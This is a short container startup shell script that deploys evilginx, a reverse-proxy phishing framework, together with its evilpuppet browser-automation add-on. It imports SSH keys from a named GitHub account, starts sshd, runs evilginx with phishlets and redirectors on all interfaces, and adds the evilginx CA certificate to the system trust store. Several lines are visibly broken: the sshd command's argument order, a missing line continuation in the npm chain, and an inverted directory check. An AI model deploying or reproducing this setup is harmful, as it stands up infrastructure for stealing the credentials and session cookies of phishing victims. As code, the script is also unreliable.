#!/usr/bin/dumb-init /usr/bin/zsh

if [ $E_PRO ]; then
    unzip -o /opt/tar/evilginx/evilginx-pro-linux-*.zip -d $E_DIR
fi

if [ -d $HOME/.evilginx ]; then
    ln -s $E_DIR $HOME/.evilginx
fi

ssh-import-id gh:oonray
service start sshd

if [ $E_PRO ]; then
    Xvfb -ac $DISPLAY -screen 0 1280x1024x16 &>/dev/null &
    cd $E_EVILPUPPET \
        && npm install
        && npm start &
fi

sudo /opt/bin/evilginx \
    -p $E_PHISHLETS \
    -t $E_REDIRECTORS \
    -P 0.0.0.0:$E_PORT &

sudo cp /root/.evilginx/crt/ca.crt \
    /usr/local/share/ca-certificates/evilginx.crt \
    && sudo update-ca-certificates

sleep infinity
